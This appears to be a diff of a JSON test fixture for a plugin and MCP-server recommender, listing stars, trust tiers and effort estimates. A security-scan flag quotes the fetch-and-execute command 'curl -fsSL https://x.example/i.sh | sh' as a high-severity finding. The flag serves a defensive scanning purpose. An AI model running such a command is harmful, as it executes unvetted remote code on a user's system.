@@ -5,31 +5,159 @@
   ],
   "recommendations": [
     {
-      "name": "acme/test-runner-mcp", "kind": "mcp-server", "stars": 1520, "starsLast7d": 84, "momentumComplete": true, "starsPerDay": 12, "momentumSource": "events",
+      "name": "acme/test-runner-mcp",
+      "kind": "mcp-server",
+      "stars": 1520,
+      "starsLast7d": 84,
+      "momentumComplete": true,
+      "starsPerDay": 12,
+      "momentumSource": "events",
       "description": "Runs your test suites from Claude — with a watch mode…",
       "stackNote": "you use vitest in 2 projects",
-      "evidence": [{ "topic": "testing", "sessions": 3, "ofSessions": 4, "friction": 2 }],
-      "trust": { "tier": "medium", "notes": ["no license", "single maintainer"], "scanned": true,
+      "evidence": [
+        {
+          "topic": "testing",
+          "sessions": 3,
+          "ofSessions": 4,
+          "friction": 2
+        }
+      ],
+      "trust": {
+        "tier": "medium",
+        "notes": [
+          "no license",
+          "single maintainer"
+        ],
+        "scanned": true,
         "flags": [
-          { "severity": "high", "id": "pipe-to-shell", "detail": "downloads and executes a script in one step", "file": "README", "line": 42, "excerpt": "curl -fsSL https://x.example/i.sh | sh" },
-          { "severity": "low", "id": "network-call", "detail": "calls a host the README never mentions", "file": "install.sh" }
-        ] },
-      "install": "/plugin marketplace add acme/test-runner-mcp then /plugin install runner@acme", "installSource": "readme"
+          {
+            "severity": "high",
+            "id": "pipe-to-shell",
+            "detail": "downloads and executes a script in one step",
+            "file": "README",
+            "line": 42,
+            "excerpt": "curl -fsSL https://x.example/i.sh | sh"
+          },
+          {
+            "severity": "low",
+            "id": "network-call",
+            "detail": "calls a host the README never mentions",
+            "file": "install.sh"
+          }
+        ]
+      },
+      "install": "/plugin marketplace add acme/test-runner-mcp then /plugin install runner@acme",
+      "installSource": "readme",
+      "effort": {
+        "type": "mcp-server",
+        "typeLabel": "MCP server",
+        "files": 31,
+        "codeFiles": 30,
+        "loc": 4500,
+        "instructionLines": 0,
+        "languages": [
+          "TypeScript"
+        ],
+        "dependencies": 3,
+        "needs": {
+          "credentials": [
+            "ACME_API_KEY"
+          ],
+          "apis": [
+            "ACME"
+          ],
+          "network": true,
+          "services": []
+        },
+        "parts": {
+          "skills": 0,
+          "hooks": false,
+          "agents": 0,
+          "commands": 0,
+          "pluginManifest": false
+        },
+        "truncated": false,
+        "advice": "install",
+        "adviceLabel": "Install",
+        "buildForm": null,
+        "buildTime": null,
+        "reason": "Wraps the ACME API with ~4,500 lines of TypeScript: installing saves you keeping up with it."
+      }
     },
     {
-      "name": "solo/db-helper", "kind": "skill", "stars": 88, "starsLast7d": 9, "momentumComplete": false, "starsPerDay": 1.3, "momentumSource": "stargazers",
+      "name": "solo/db-helper",
+      "kind": "skill",
+      "stars": 88,
+      "starsLast7d": 9,
+      "momentumComplete": false,
+      "starsPerDay": 1.3,
+      "momentumSource": "stargazers",
       "description": "",
-      "evidence": [{ "topic": "database", "sessions": 1, "ofSessions": 4, "friction": 1 }, { "topic": "debugging", "sessions": 2, "ofSessions": 4 }],
-      "trust": { "tier": "low", "notes": [], "scanned": false, "flags": [] },
-      "install": "See the README for install steps: https://github.com/solo/db-helper#readme", "installSource": "readme-link"
+      "evidence": [
+        {
+          "topic": "database",
+          "sessions": 1,
+          "ofSessions": 4,
+          "friction": 1
+        },
+        {
+          "topic": "debugging",
+          "sessions": 2,
+          "ofSessions": 4
+        }
+      ],
+      "trust": {
+        "tier": "low",
+        "notes": [],
+        "scanned": false,
+        "flags": []
+      },
+      "install": "See the README for install steps: https://github.com/solo/db-helper#readme",
+      "installSource": "readme-link"
     },
     {
-      "name": "big/agent-kit", "kind": "plugin", "stars": 120345, "starsPerDay": 210.5, "momentumSource": "measured",
+      "name": "big/agent-kit",
+      "kind": "plugin",
+      "stars": 120345,
+      "starsPerDay": 210.5,
+      "momentumSource": "measured",
       "description": "Toolkit for agents. 日本語 docs.",
       "evidence": [],
       "stackNote": "you use react in 1 project",
-      "trust": { "tier": "high", "notes": [] },
-      "install": "git clone https://github.com/big/agent-kit ~/.claude/skills/agent-kit"
+      "trust": {
+        "tier": "high",
+        "notes": []
+      },
+      "install": "git clone https://github.com/big/agent-kit ~/.claude/skills/agent-kit",
+      "effort": {
+        "type": "instructions",
+        "typeLabel": "instructions-only skill",
+        "files": 2,
+        "codeFiles": 0,
+        "loc": 0,
+        "instructionLines": 140,
+        "languages": [],
+        "dependencies": null,
+        "needs": {
+          "credentials": [],
+          "apis": [],
+          "network": false,
+          "services": []
+        },
+        "parts": {
+          "skills": 1,
+          "hooks": false,
+          "agents": 0,
+          "commands": 0,
+          "pluginManifest": false
+        },
+        "truncated": false,
+        "advice": "build",
+        "adviceLabel": "Build your own",
+        "buildForm": "skill",
+        "buildTime": "under an hour",
+        "reason": "Only instructions (~150 lines of Markdown) and no external API, so writing your own is quick."
+      }
     }
   ]
 }
